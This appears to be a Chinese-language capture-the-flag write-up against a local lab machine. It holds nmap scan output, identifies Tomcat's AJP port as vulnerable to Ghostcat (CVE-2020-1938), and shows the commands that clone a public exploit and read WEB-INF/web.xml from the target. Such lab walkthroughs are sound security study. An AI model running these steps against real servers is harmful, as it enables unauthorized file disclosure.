## 信息收集
### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A 192.168.56.132    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-27 06:37 EDT
Nmap scan report for 192.168.56.132
Host is up (0.0011s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: \xE5\x88\xA9\xE5\x85\xB9\xE4\xB8\x8E\xE9\x9D\x92\xE9\xB8\x9F | \xE5\xB1\xB1\xE7\x94\xB0\xE5\xB0\x9A\xE5\xAD\x90\xE6\x89\xA7\xE5\xAF\xBC\xE7\x9A\x84\xE9\x9D\x92\xE6\x98\xA5\xE8\xAF\x97\xE7\xAF\x87
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
MAC Address: 08:00:27:9C:B6:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.56.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.94 seconds
-
```
发现AJP = Apache 和 Tomcat 之间的通信协议

### 查看页面
![image.png](https://gitee.com/fogpost/photo/raw/master/202603271859496.png)
![image.png](https://gitee.com/fogpost/photo/raw/master/202603271859483.png)

初步认为认为是Ghostcat (CVE-2020-1938)

## 攻击靶机
```bash
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
cd CNVD-2020-10487-Tomcat-Ajp-lfi
```

```bash
python3 tomcat-ajp-lfi.py ip -p 8009 -f WEB-INF/web.xml
```

发现连不上问了才知道是移位密码jndi.jsp
然后进入对应页面
![image.png](https://gitee.com/fogpost/photo/raw/master/202603272112518.png)
